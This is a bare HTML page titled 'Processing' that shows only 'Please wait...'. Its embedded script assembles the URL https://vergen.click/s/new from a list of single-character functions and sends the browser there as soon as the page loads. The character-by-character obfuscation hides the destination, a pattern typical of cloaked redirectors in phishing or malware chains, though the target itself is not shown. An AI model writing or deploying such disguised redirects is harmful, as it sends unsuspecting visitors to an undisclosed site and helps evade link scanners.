<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            () => 'h',
            _ => 't',
            function() { return 't'; },
            () => 'p',
            _ => 's',
            function() { return ':'; },
            function() { return '/'; },
            () => '/',
            () => 'v',
            () => 'e',
            function() { return 'r'; },
            function() { return 'g'; },
            function() { return 'e'; },
            function() { return 'n'; },
            () => '.',
            function() { return 'c'; },
            () => 'l',
            () => 'i',
            function() { return 'c'; },
            () => 'k',
            function() { return '/'; },
            _ => 's',
            () => '/',
            _ => 'n',
            function() { return 'e'; },
            () => 'w'
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
